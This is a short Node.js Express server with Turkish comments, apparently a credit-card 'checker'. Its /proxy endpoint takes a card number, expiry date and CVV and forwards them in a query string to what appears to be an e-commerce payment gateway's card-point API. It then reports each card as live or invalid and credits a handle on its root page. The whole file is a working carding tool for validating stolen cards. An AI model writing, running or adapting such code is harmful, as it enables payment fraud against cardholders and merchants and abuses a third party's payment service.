const express = require("express");
const cors = require("cors");
const axios = require("axios");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/proxy", async (req, res) => {
  const { cc, month, year, cvv } = req.body;

  if (!cc || !month || !year || !cvv) {
    return res.status(400).json({ error: "Eksik bilgi gönderildi." });
  }

  try {
    // Gerçek API adresin buraya gelecek
    const apiUrl = `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=45542`;

    const response = await axios.get(apiUrl);

    // Gerçek veri geldiyse:
    res.json({
      live: true,
      message: "✅ Geçerli Kart | " + JSON.stringify(response.data),
    });
  } catch (error) {
    res.json({
      live: false,
      message: "❌ Geçersiz Kart veya API reddetti",
    });
  }
});

app.get("/", (req, res) => {
  res.send("Proxy API çalışıyor! - @HzQuarex");
});

app.listen(PORT, () => {
  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
});
